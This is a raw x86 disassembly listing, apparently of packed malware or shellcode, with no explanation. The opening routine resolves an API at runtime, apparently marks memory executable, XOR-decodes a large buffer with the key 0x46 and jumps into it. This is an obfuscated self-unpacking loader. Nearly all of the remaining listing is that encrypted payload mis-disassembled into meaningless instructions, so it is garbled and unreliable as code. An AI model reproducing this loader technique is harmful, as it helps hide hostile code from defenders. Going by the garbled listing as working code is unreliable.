add al [ esi + 0x46 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x1469
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x40
push 0x59d3
mov eax [ ebp + 0x8 ]
push eax
call [ ebp - 0x14 ]
nop
xor eax eax
mov [ ebp - 0x8 ] eax
nop
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
mov al [ eax ]
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
xor al 0x46
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
mov [ edx ] al
nop
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x59d4
jne r-xdata
nop
mov eax [ ebp + 0x8 ]
add eax 0x35b6
mov [ ebp - 0x4 ] eax
nop
nop
jmp [ ebp - 0x4 ]
sub_46e5ea
adc ebx eax
and bh cl
add ebp esp
int 0x90
jne r-xdata
inc esi
sub al 0x56

sub al 0x32
and bh cl
adc esp esp
sbb al 0x20
iretd
sub_46e5fd
or esp eax
and bh cl
add ebp eax
scasd [ edi ]
cmp [ edi + 0x46 ] 0x46
salc
jne r-xdata
cmp edi [ edx - 0x1f3cb6b9 ]
jge r-xdata
and bh cl
adc esp esp
sbb al 0x20
iretd
jpe r-xdata
jne r-xdata
dec ecx
rcr [ eax - 0x50b9b9a4 ] 0x2
or eax 0xd6d64646
salc
salc
salc
and bh cl
xor ebp [ esi ]
scasd [ edi ]
fist [ eax ]
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
int 0x9e
retn
inc esi
inc esi
salc
salc
push ds
scasd [ edi ]
push cs
adc al 0x46
inc esi
salc
salc
salc
salc
mov ecx 0x4646cad0
inc esi
retn
adc al [ esi + 0x46 ]
int 0x0
jb r-xdata
insd
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x3bc51a11
mov edx 0xe0c34947
inc esi
inc esi
sub al 0x44
mov ecx 0x9ecd4a10
lds edi [ ebp - 0x2a3cb647 ]
imul eax [ esi + 0x46 ] 0x75
xchg [ edi + 0x46466d82 ] ch
sub_46e631
popfd
scasd [ edi ]
jo r-xdata
push ecx
inc esi
inc esi
scasd [ edi ]
sti
or eax [ esi + 0x46 ]
salc
salc
pop ds
pop ds
retn
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
lodsb [ esi ]
sub_46e693
inc esi
inc esi
scasd [ edi ]
test al 0x7d
inc esi
inc esi
salc
mov ecx 0x4646f2d0
inc esi
sbb [ 0xffffffffd6d6858f ] ebx
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x5aa0
sub_46e6bc
or eax 0xdcd170e
push ds
scasb [ edi ]
inc ebp
jns r-xdata
salc
salc
salc
salc
inc esi
pop ds
scasb [ edi ]
cld
adc al 0x46
inc esi
lds edi [ esi + 0x7f22af47 ]
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ds
sub al 0x28
int 0x8e
and bh cl
or esi [ esi - 0x50cdd3e1 ]

adc ebx eax
mov al 0xaf
dec esi
dec edi
inc esi
inc esi
and [ ebp ] bh
inc eax
dec ecx
lds ebp [ ebx - 0x50b9b9b0 ]
adc eax 0xd6464674
int 0x8e
scasb [ edi ]
push ds
pop ebp
inc esi
inc esi
adc eax 0xb0eac3cb
mov ecx 0x10b916b9
jbe r-xdata
adc eax 0xfaf6cd10
inc esi
inc esi
inc esi
jne r-xdata
retn
sub_46e6f0
push eax
inc esi
inc esi
salc
pop ds
test esi edx
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0xb
push edx
scasd [ edi ]
jle r-xdata
inc esi
inc esi
salc
salc
salc
salc

inc esi
inc esi
salc
salc
salc
salc
adc ebx eax
mov al 0xaf
dec esi
dec edi
inc esi
inc esi
and [ ebp ] bh
inc eax
dec ecx
lds ebp [ ebx - 0x50b9b9b0 ]
adc eax 0xd6464674
int 0x8e
scasb [ edi ]
push ds
pop ebp
inc esi
inc esi
adc eax 0xb0eac3cb
mov ecx 0x10b916b9
jbe r-xdata
adc eax 0xfaf6cd10
inc esi
inc esi
inc esi
jne r-xdata
retn
sub_46e77a
out 0xbb al
mov ecx 0xb91516b9
adc [ edx ] ecx
scasd [ edi ]
mov ebp 0xd646467a
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
lds ebp [ edx + 0x1e222c5a ]
sub al 0x31
and bh cl
add esp [ edx + 0x20232c1e ]
iretd
sub_46e7e0
xchg [ edi + 0x46465208 ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc

sub_46e82b
adc esp [ esi ]
sbb al 0x2c
and al 0xaf
xchg esi eax
inc edi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
adc ebp [ edi + 0x464615d3 ]
salc
salc

sub_46e857
cmp ecx [ esi + 0x464570af ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0xf1495a11
add [ eax - 0x51 ] al
salc
push ebx
inc esi
inc esi
salc
int 0x99
scasd [ edi ]
pop ss
inc esi
inc esi
salc
salc
scasb [ edi ]
inc ebx
mov ecx 0xaf1fb9b9
jecxz r-xdata
add al 0x46
inc esi
salc
salc
salc

inc esi
inc esi
salc
salc
dec ecx
retn 0x797d
sub_46e894
inc esi
inc esi
jne r-xdata
mov ecx 0xd6d6d6b9
salc
salc
salc
sbb al 0x2c
and ah [ eax ]
iretd
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
sub al 0x66
adc eax 0x5f73af15
inc esi
inc esi

sub_46e955
mov esp 0x466ac7af
inc esi
salc
salc
salc
jg r-xdata
xchg [ edi - 0x2929297b ] cl
salc
salc
salc
salc
salc
salc
adc eax 0x46040faf
inc esi
salc
salc
jg r-xdata
mov edx 0x8f86d349
test esi edx
salc
salc
jns r-xdata
push edx
dec ecx
retn
salc
salc
salc
dec ecx
retn
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
pop ds
retn
sub_46e97c
mov edx [ ebx + 0x46 ]
inc esi
scasd [ edi ]
mov [ 0xffffffffd6464657 ] al
salc
salc
mov ecx 0xd1b95633
mov dl 0x46
inc esi
inc esi
sbb [ eax ] ebx
sbb eax 0xd6d6858f
salc
salc
salc
salc
salc
salc
adc [ edx + ebx ] ch
push ds
scasd [ edi ]
0x2046466c 0x3cf
sub_46e9aa
mov esp 0x3e2c8675
and bh cl
add edi [ edx + 0x466579af ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
pop ds
retn
sub_46e9c3
xchg [ ecx - 0x3e ] cl
inc ebp
inc esi
inc esi
inc esi
jne r-xdata
dec eax
dec ecx
push es
sbb [ edi + 0x46464893 ] ebp
salc
salc
salc
dec ecx
iretd
sub_46e9d8
outsb
dec esi
inc esi
inc esi
scasd [ edi ]
xlat
inc esi
inc esi
scasb [ edi ]
jecxz r-xdata
sub al 0x46
adc [ esi + 0x46465200 ] ch
lds eax [ edx + 0x7a3d7f4a ]
scasd [ edi ]
jns r-xdata
inc esi
inc esi
iretd
iretd
inc esi
inc esi
salc
salc
and bh cl
sbb eax [ eax + 0x2c ]
jb r-xdata
scasd [ edi ]
and cl [ eax + 0x46 ]
inc esi

push eax
jge r-xdata
inc esi
lds edi [ edx ]
bound esp [ edx + 0x46 ]
dec ecx
retn 0x45be
inc esi
salc
salc
salc
lds eax [ edx + 0x4986c34a ]
retn 0x15ee
sub_46e9e7
shl dh 0x46
inc esi
inc esi
lds eax [ edx - 0x507f328a ]
mov ebx 0xd646465a
salc
salc
sbb [ esi + edi ] ebp
sbb al 0x2c
add [ edi + 0x46464d47 ] ebp
salc
and bh cl
adc esp [ esp + ebx ]
and bh cl
adc esp [ edx ]
scasd [ edi ]
and cl [ eax + 0x46 ]
inc esi

sub_46ea21
arpl [ esi + 0x46 ] ax
dec ecx
int1
add [ edx - 0x35 ] dl
add dh [ esi + 0x5e ]
scasd [ edi ]
in al dx
mov esp 0xd6d6b9b9
salc
salc
salc
salc
salc
mov ecx 0x4646ead0
inc esi
test [ cs : esi + 0x46 ] eax
inc esi
sub al 0x46
adc [ esi + 0x46465200 ] ch
lds eax [ edx + 0x7a3d7f4a ]
scasd [ edi ]
jns r-xdata
iretd
inc esi
inc esi
salc
salc
and bh cl
sbb eax [ eax + 0x2c ]
jb r-xdata
scasd [ edi ]
and cl [ eax + 0x46 ]
inc esi

push eax
jge r-xdata
inc esi
lds edi [ edx ]
bound esp [ edx + 0x46 ]
dec ecx
retn 0x45be
inc esi
salc
salc
salc
lds eax [ edx + 0x4986c34a ]
retn 0x15ee
sub_46ea6f
inc esi
inc esi
inc esi
push esi
inc esi
inc esi
scasd [ edi ]
in eax 0x43
inc esi
inc esi
salc
salc

sub_46ea7e
add ah [ edx + 0x62 ]
push ss
dec ecx
int1
inc ecx
push ss
and ch cl
add [ eax + 0x45 ] eax
add ah [ edx + 0x66 ]
dec ecx
int1
xchg [ esi ] dl
int 0x80
scasb [ edi ]
and eax 0xc5464659
or [ edx - 0x31 ] 0x2
bound edx [ esi - 0x3d ]
xchg [ ecx - 0x3e ] cl
inc ebp
inc edx
inc esi
inc esi
lds edi [ edx ]
bound esp [ edx + 0x46 ]
dec ecx
retn 0x45be
sub_46eab8
inc esi
inc esi
inc esi
push ss
inc edx
inc edi
inc esi
inc esi
mov ecx 0x4646fed0
inc esi
scasd [ edi ]
inc ebp
inc esi
inc esi
and bh cl
sbb ebp [ eax + 0x1bcf201d ]
mov dh 0x2c
xor ebx [ 0xffffffffb41bcf20 ]
scasd [ edi ]
lahf
pop esp
inc esi
inc esi
salc

sub_46eae3
add ebp esi
scasd [ edi ]
jle r-xdata
sbb eax 0xcf20322c
sbb esp eax
sbb eax 0xcf20352c
sbb ebp esi
scasd [ edi ]
sbb [ ecx + 0x46 ] 0x46
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0xb
mov edx 0xcdba37b9
inc edi
scasd [ edi ]
sub bh [ edi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds edi [ ecx - 0x50e2e695 ]
fisub [ esi + eax * 2 + 0x46 ]
salc
adc [ edi + 0x46464ccc ] ebp
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x4cf9
inc esi
inc esi
salc
salc
salc
dec ecx
retn 0x678f
sub_46eaf1
inc esi
inc esi
sub al 0x46
mov bh 0x5b
das
push es
scasd [ edi ]
shl [ edx + 0x46 ] cl
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edi + 0x7fc52044 ]
dec cx
retn 0x45a6
sub_46eb1d
inc esi
inc esi
scasd [ edi ]
dec ecx
push ebp
inc esi
inc esi
and bh cl
sbb esp esi
sub al 0x35
int 0x9f
and bh cl
sbb esp esp
int 0x9c
and bh cl
sbb esp edx
sbb eax 0xcf20322c
sbb esp eax
sbb eax 0xcf20352c
sbb ebp esi
scasd [ edi ]
sbb [ ecx + 0x46 ] 0x46
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0xb
mov edx 0xcdba37b9
inc edi
scasd [ edi ]
sub bh [ edi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds edi [ ecx - 0x50e2e695 ]
fisub [ esi + eax * 2 + 0x46 ]
salc
adc [ edi + 0x46464ccc ] ebp
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x4cf9
sub_46ebfb
add esi [ esi + 0x1bcf1116 ]
mov dh 0xae
inc edi
or eax [ esi + 0x46 ]
scasd [ edi ]
sbb al 0xb8
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
retn
sub_46ec15
xchg [ ecx - 0x3e ] cl
pop esi
inc esi
inc esi
inc esi
sub al 0x46
mov ecx 0x4646ead0
inc esi
inc esi
inc edi
inc esi
inc esi
sub al 0x46
adc [ esi + 0x46465426 ] ch
lds eax [ edx + 0xb08ae4a ]
inc esi
inc esi
jge r-xdata
salc
salc
push ds
sub al 0x66
and bh cl
add ebp [ esi + ebx - 0x30df9cd4 ]
add ebp [ edx + 0x51c4af1e ]
inc esi
inc esi
scasb [ edi ]
out dx al
pop ss
inc esi
inc esi
inc ebp
xchg [ edi + 0x46460870 ] ch
salc
salc
salc
salc
salc
salc
salc
salc
jg r-xdata
dec ecx
retn 0x3a
pop edi
inc esi
inc esi
salc
salc
salc
salc
pop ds
int 0xbe
scasd [ edi ]
dec esp
jle r-xdata
mov esi 0x465f10af
inc esi
inc esi
scasd [ edi ]
inc ebp
push edx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
and bh cl
add esi [ eax + 0x22c8675 ]
and bh cl
add edi [ esi + 0x10c203cb ]
scasd [ edi ]
dec esi
dec ebp
inc esi
inc esi
mov ecx 0x4646cad0
inc esi
jg r-xdata
inc esi

mov edx 0x46662baf
inc esi
add [ ebx ] 0x1e0b0b9e
and eax [ ecx + 0x10289a03 ]
or ecx [ ebx ]
scasb [ edi ]
mov al [ 0x19464672 ]
sbb [ 0x7aaf86c3 ] bl
dec ebx
inc esi
inc esi
salc
salc
inc edx
inc edi
inc esi
inc esi
scasd [ edi ]
sub_46ecd2
add esp edx
add [ ebx ] 0xb100da2
or eax 0x10ae0381
or ecx [ 0xffffffffaa038110 ]
or ecx [ 0x3810b10 ]
xchg edx eax
or ebp [ edi ]
and eax 0x9e038134
sub [ 0x3812029 ] esi
0x300e6632 0x40af
dec esp
inc esi
inc esi
salc
salc
salc
salc
salc
salc
scasb [ edi ]
sub eax 0x1f464674
retn
sub_46ed2b
xchg edx eax
mov ebx 0xae16b9b9
push edx
inc esi
inc esi
inc esi
lds eax [ edx + 0x20858f56 ]
lds edi [ esi + 0x46 ]
scasd [ edi ]
jo r-xdata
push eax
inc esi
inc esi
scasd [ edi ]
xor al 0x5b
inc esi
inc esi
salc
add [ edx ] 0x7cde5e62
inc esi
inc esi
sub al 0x42
inc esi
jbe r-xdata
inc esi
salc
salc
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
pop ss
adc eax 0x11b97511
adc [ edi + 0x46464543 ] ebp
salc
salc
lds eax [ edx + 0x4986c352 ]
retn 0x4ea0
mov edx 0x4641edaf
inc esi
salc
salc
salc
salc
retn
inc esi
adc [ 0x46c6d0b9 ] edx
inc esi
inc esi
iretd
sub_46ed63
inc esi
inc esi
lds edi [ ebx ]
mov edx 0x9aca4942
dec esi
inc esi
inc esi
int 0xe
inc edx
dec ecx
int1
dec edi
lds edi [ edi - 0x7b3cb689 ]
imul eax [ esi + 0x46 ] 0xffffffb9
dec edx
mov ecx 0x81cd4e36
scasb [ edi ]
mov dl [ eax + 0x46 ]
inc esi
scasd [ edi ]
xor al 0x5b
inc esi
inc esi
salc
add [ edx ] 0x7cde5e62
inc esi
inc esi
sub al 0x42
inc esi
jbe r-xdata
mov edx 0x4641edaf
inc esi
salc
salc
salc
salc
retn
inc esi
adc [ 0x46c6d0b9 ] edx
inc esi
inc esi
iretd
sub_46edbc
rcr [ edi ] 0xd8
mov ecx 0xb9ffdfb9
inc esi
inc esi
inc esi
mov cl 0xbf
adc [ edi + ebp * 4 ] edx
mov ah 0x6f
inc esi
inc esi
salc
salc
adc ecx ebp
stosb [ edi ]
lds ebp [ edx - 0x798aea86 ]
adc [ ecx ] dl
iretd
sub_46edf0
xchg [ ecx - 0x3e ] cl
or eax 0xaf464647
lds eax [ ebx + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x2b
and bh cl
add ebx [ edi + ebp * 4 - 0x25 ]
je r-xdata
xor ebx [ edx - 0x46e5ee47 ]
xor [ esi ] dl

inc esi
salc
salc
salc
mov ecx 0x3cd5233
dec esi
scasd [ edi ]
jmp r-xdata
scasd [ edi ]
aas
je r-xdata
mov esi 0xc249bd45
scasb [ edi ]
je r-xdata
inc esi
salc
salc
salc
mov cl 0x33
push esi
add [ edi + 0x4646063d ] ch
salc
salc
inc esi
scasd [ edi ]
inc edi
or [ esi + 0x46 ] eax
salc
salc
salc
mov ecx 0x3cd4a33
dec esi
mov ecx 0x8f752216
lds edi [ esi - 0x782cb647 ]
int 0x87
scasd [ edi ]
mov ah 0xf
inc esi
inc esi
salc
salc
salc
salc
scasd [ edi ]
inc ebp
inc esi
inc esi
salc
scasd [ edi ]
dec eax
mov edx 0xd6d6b9b9
salc
salc
salc
salc
adc [ edi + 0x46465d32 ] ebp
salc
salc
salc
jne r-xdata
and esp [ edx + 0x78af1546 ]
mov al 0xb9
mov ecx 0x6232b9d6
pop esi
mov ecx 0xf0493210
add [ edx - 0x47 ] eax
add ah [ edx + 0x5e ]
jg r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
pop ss
push ss
and bh cl
add ah [ edx + 0x1e ]
mov ecx 0x4646a2d0
inc esi
inc esi
mov [ esi + 0x46 ] 0x2c
inc esi
scasd [ edi ]
adc [ ecx - 0x29294647 ] edi
dec ecx
retn 0x6985
sbb [ 0xffffffffd6d6858f ] bl
dec ecx
les ebx [ edi + edi * 2 ]
inc esi
inc esi
dec ecx
int1
add eax 0x86c3205a
dec ecx
retn 0x74b4
bound ebx [ esi + 0x49 ]
sub_46ee96
cmp al [ edx + 0x46 ]
inc esi
lds esp [ ebx ]
mov [ 0x78af1546 ] al
mov al 0xb9
mov ecx 0x6232b9d6
pop esi
mov ecx 0xf0493210
add [ edx - 0x47 ] eax
add ah [ edx + 0x5e ]
jg r-xdata
dec ecx
les ebx [ edi + edi * 2 ]
inc esi
inc esi
dec ecx
int1
add eax 0x86c3205a
dec ecx
retn 0x74b4
bound ebx [ esi + 0x49 ]
sub_46eec9
inc esi
inc esi
int 0xbe
inc ebp
mov ebp 0x74aec249
inc esi
inc esi
scasd [ edi ]
inc edi
or [ esi + 0x46 ] eax
salc
salc
salc
mov ecx 0x3cd4a33
dec esi
mov ecx 0x8f752216
lds edi [ esi - 0x782cb647 ]
int 0x87
scasd [ edi ]
mov ah 0xf
inc esi
inc esi
salc
salc
salc
salc
scasd [ edi ]
inc ebp
inc esi
inc esi
salc
scasd [ edi ]
dec eax
mov edx 0xd6d6b9b9
salc
salc
salc
salc
adc [ edi + 0x46465d32 ] ebp
salc
salc
salc
jne r-xdata
and esp [ edx + 0x78af1546 ]
mov al 0xb9
mov ecx 0x6232b9d6
pop esi
mov ecx 0xf0493210
add [ edx - 0x47 ] eax
add ah [ edx + 0x5e ]
jg r-xdata
sbb [ 0xffffffffd6d6858f ] bl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
pop ss
push ss
and bh cl
add ah [ edx + 0x1e ]
mov ecx 0x4646a2d0
inc esi
inc esi
mov [ esi + 0x46 ] 0x2c
inc esi
scasd [ edi ]
adc [ ecx - 0x29294647 ] edi
dec ecx
retn 0x6985
dec ecx
les ebx [ edi + edi * 2 ]
inc esi
inc esi
dec ecx
int1
add eax 0x86c3205a
dec ecx
retn 0x74b4
bound ebx [ esi + 0x49 ]
sub_46ef96
mov al 0xb9
mov ecx 0xa233b916
scasd [ edi ]
push edx
mov al 0xb9
mov ecx 0xc603cb16
scasd [ edi ]
dec ebx
inc si
inc esi
salc
salc
salc
int 0xa3
scasd [ edi ]
push ebp
inc esi
inc esi
salc
salc
salc
pop ds
scasd [ edi ]
adc al 0x5c
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x33
dec esi
int3
sub_46f01f
add ebx [ esi - 0x65cc46ea ]
scasd [ edi ]
mov [ ecx + 0x46 ] ds
inc esi
dec ecx
enter 0x5775 0x46
inc esi
int 0xfe
xchg [ esi + 0x46 ] al
inc esi
scasd [ edi ]
inc eax
push edi
inc esi
inc esi
salc
sub al 0x68
and bh cl
add edi [ edi + ebp * 4 + 0x4646512d ]
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x62c3
sub_46f0a2
add edi [ ecx - 0x45c650ea ]
mov ecx 0x16d6d6b9
adc eax 0xaa038015
inc [ ecx + 0x462cb703 ]
sub al 0x46
scasd [ edi ]
idiv [ edx + 0x46 ]
inc esi
dec ecx
int1
push edx
aaa

sub_46f0c4
cmp al 0xf9
lds edi [ ecx - 0x613eb6a1 ]
jb r-xdata
salc
salc
sub al 0x31
and bh cl
adc ecx [ edx - 0x50cbd3e4 ]
and al [ ecx + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0xc8
xchg [ esi + 0x46 ] al
inc esi
das
xchg dl al
inc esi
inc esi
inc esi
int 0xd3
0xafb9b9bb 0x5b0c
inc esi
inc esi
salc
salc
salc
salc
salc
salc
int 0x44
insd
inc edi
test esi edx
salc
salc
salc
salc
salc
jne r-xdata
inc esi
scasd [ edi ]
xchg esi eax
jb r-xdata
iretd
scasd [ edi ]
movsb [ edi ] [ esi ]
dec edx
inc esi
inc esi
salc
salc
salc
mov ecx 0x4646a6d0
inc esi
int 0x13
dec esi

iretd
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub_46f0e9
shl dl 0x46
inc esi
inc esi
lds eax [ edx - 0x55fc3482 ]
scasd [ edi ]
sbb cl [ edi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
adc esp [ esi + 0x460707af ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x31
and bh cl
adc ecx [ edx - 0x50cbd3e4 ]
and al [ ecx + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0xc8
xchg [ esi + 0x46 ] al
inc esi
das
xchg dl al
inc esi
inc esi
inc esi
int 0xd3
0xafb9b9bb 0x5b0c
inc esi
inc esi
salc
salc
salc
salc
salc
salc
int 0x44
insd
inc edi
test esi edx
salc
salc
salc
salc
salc
jne r-xdata
iretd
scasd [ edi ]
movsb [ edi ] [ esi ]
dec edx
inc esi
inc esi
salc
salc
salc
mov ecx 0x4646a6d0
inc esi
int 0x13
dec esi

sub_46f1c9
pop ebx
inc esi
inc esi
int 0x36
jpe r-xdata
mov al 0xcd
mov ch cl
cdq
xchg ebp eax
mov ebp 0x44e80c5
into
sbb dl [ ebx - 0x1f ]
scasd [ edi ]
cld
dec edx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
inc ebp
or edi [ edx + 0x62b3af16 ]
inc esi
inc esi
salc
salc
salc
inc ebp
or ecx [ esi - 0x33 ]
push es
mov esi 0x17ba0345
push ss
mov ecx 0xf5afa233
mov al 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
and [ edi + 0x4e ] bh
dec ecx
retn
push 0x2
inc esi
inc esi
salc
and bh cl
cmp eax [ eax + 0x466545af ]
inc esi
lds eax [ edx - 0x34a9d3b6 ]
add ah [ edx + 0x7a ]
adc [ esi ] edx
scasb [ edi ]
in eax 0x4a
inc esi
inc esi
lds eax [ edx + 0xecaaf4a ]
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
pop ds
scasd [ edi ]
mov [ esi + eax * 2 + 0x46 ] 0xaf068675
cmpsb [ esi ] [ edi ]
add al [ esi + 0x46 ]
salc
salc
salc
salc
salc
salc
push es
push ss

sub_46f216
scasb [ edi ]
mov edx 0xaf16b9b9
xlat
dec edi
inc esi
inc esi
pop ss
push [ esi + 0x46 ]
inc esi
inc esi
and cl ch
inc edi
scasd [ edi ]
mov esp 0xd6464668
salc
salc
salc
salc

sub_46f236
mov ebx 0xaf16b9b9
mov ds [ edi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
scasb [ edi ]
shl [ edx + 0x46 ] 0x46
pop ds
pop ds
retn
sub_46f267
xchg [ edi + 0x464602b7 ] ch
salc
salc
salc
and bh cl
cmp esp [ ecx + ebx - 0x51c430e0 ]
sub al 0x2b
scasd [ edi ]
test eax 0xd646467a
salc
salc
salc
salc
dec ecx
int1
push edi
scasd [ edi ]
pushfd
inc esp
inc esi
inc esi
lds eax [ edx + 0x499dc34a ]
retn 0x65b
sub_46f2b6
add eax 0x87c51556
mov dh 0xae
dec edi
jne r-xdata
scasd [ edi ]
in eax dx
push eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss
push ss
push ss
scasd [ edi ]
jge r-xdata
inc esi
int 0x5
jb r-xdata
salc
scasb [ edi ]
add al 0x68
inc esi
inc esi
retn
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x3
mov esi 0xb9b8ecaf
mov ecx 0xc6d1b9d6
inc esi
inc esi
inc esi
push ss
scasd [ edi ]
insb
inc esi
inc esi
salc
salc
push ss
scasd [ edi ]
test [ esi + 0x46 ] eax
inc esi
retn
sub_46f2c6
xchg [ ecx - 0x3e ] cl
inc edx
inc esi
inc esi
inc esi
push ss
mov ecx 0x3dc54e10
push es
inc esi
scasd [ edi ]
push ebp
mov esi 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x3
mov esi 0xb9b8ecaf
mov ecx 0xc6d1b9d6
inc esi
inc esi
inc esi
push ss
scasd [ edi ]
insb
inc esi
inc esi
salc
salc
push ss
scasd [ edi ]
test [ esi + 0x46 ] eax
inc esi
scasd [ edi ]
in eax dx
push eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss
push ss
push ss
scasd [ edi ]
jge r-xdata
salc
scasb [ edi ]
add al 0x68
inc esi
inc esi
retn
inc esi
inc esi
salc
salc
salc
salc
salc
sub_46f338
add edi [ esi + 0x32af817d ]
mov bh 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
pop ds
sub al 0x68
and bh cl
or esi [ edx - 0x50c1d3e1 ]
pop esp
push esi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc [ ecx ] dl
sub al 0x27
scasd [ edi ]
or [ edx + 0x46 ] edi
inc esi
salc
salc
salc
salc
salc
salc
dec ecx
int1
push edi
scasd [ edi ]
int3
sub_46f394
add edi [ edx + 0x42ba03c5 ]
dec ecx
int1
test bl cl
push ds
inc esp
sub eax 0x9d2d4386
inc ebx
add [ edx + 0x75 ] 0x2e
int 0x1b
mov edx 0x465e3faf
inc esi
salc
salc
salc
salc
salc
salc
mov ecx 0x11b9b233
xor ch [ edi + 0x464647c4 ]
salc
salc
salc
salc
salc
salc
int 0xb1
scasd [ edi ]
or eax 0xd6b9b9b3
salc
salc
mov ecx 0x9ecd7e10
scasd [ edi ]
adc eax 0xcb464605
retn
sub_46f3df
mov ebx 0xaf16b9b9
pushfd
mov dh 0xb9
mov ecx 0x9403cf20
scasd [ edi ]
mov [ ecx + 0x46 ] 0xd6d6d646
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_46f403
inc esi
inc esi
scasd [ edi ]
or al 0x1
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x76ba
sub_46f475
sti
outsd
inc esi
inc esi
insd
add ah [ edx + 0x42 ]
push cs
test esi edx
salc
salc
salc
salc
salc
retn
sub_46f486
xchg [ ecx - 0x3d ] cl
jpo r-xdata
inc esi
inc esi
int 0xb
dec esi
scasd [ edi ]
and al 0xbe
mov ecx 0xd6d6d6b9
salc
sbb eax 0xc24986c3
cmpsb [ esi ] [ edi ]
push esi
inc esi
inc esi
scasd [ edi ]
pushad
jle r-xdata
mov ecx 0xaa03cbb9
push ss
int 0x80
scasb [ edi ]
mov ah 0xb9
mov ecx 0x4986c31f
retn
mov ecx 0xe603cbb9
scasd [ edi ]
inc esi
adc ebp [ edi + 0x46465325 ]
salc
mov ecx 0x86757a10
jg r-xdata
sub ch [ edx + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss
scasd [ edi ]
xor al 0x56
inc esi
inc esi
salc
salc
salc
salc
salc
salc
dec ecx
out 0xaf al
mov edx 0x1986d249
sbb eax 0xc206858f
sub_46f4c0
add eax 0xf049167e
add eax 0x35b91658
push ds
int 0x80
adc [ edi + 0x464663b8 ] ebp
scasd [ edi ]
pop ecx
outsb
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
rol [ edi + 0x29afbfcd ] cl
inc ebp
inc esi
inc esi
salc
scasd [ edi ]
mov ecx 0xd6b9b9b0
salc
salc
salc
salc
salc
salc
and bh cl
or ebp [ ebp + ecx * 8 + 0x4a77af8e ]
inc esi
inc esi
and bh cl
adc ebx esp
sbb al 0x2c
xor ebp [ edi + 0x46467cb5 ]
salc
salc
salc
salc
salc
int 0x8e
and bh cl
add esp [ edx + 0x3e2c8675 ]
scasd [ edi ]
stc
inc esi
inc esi
inc esi
salc
salc
salc
salc
push ss
add [ esi + 0x41 ] 0xb9464746
xor esp [ esi - 0x506dfc31 ]
outsb
inc esi
inc esi
salc
mov ecx 0x11b9a233
iret
sub_46f60a
add [ esi ] al
scasd [ edi ]
jg r-xdata
dec ecx
int1
pop ecx
scasd [ edi ]
adc [ eax ] al
inc esi
inc esi
salc
sub al 0x56

inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0xf5afba33
jo r-xdata
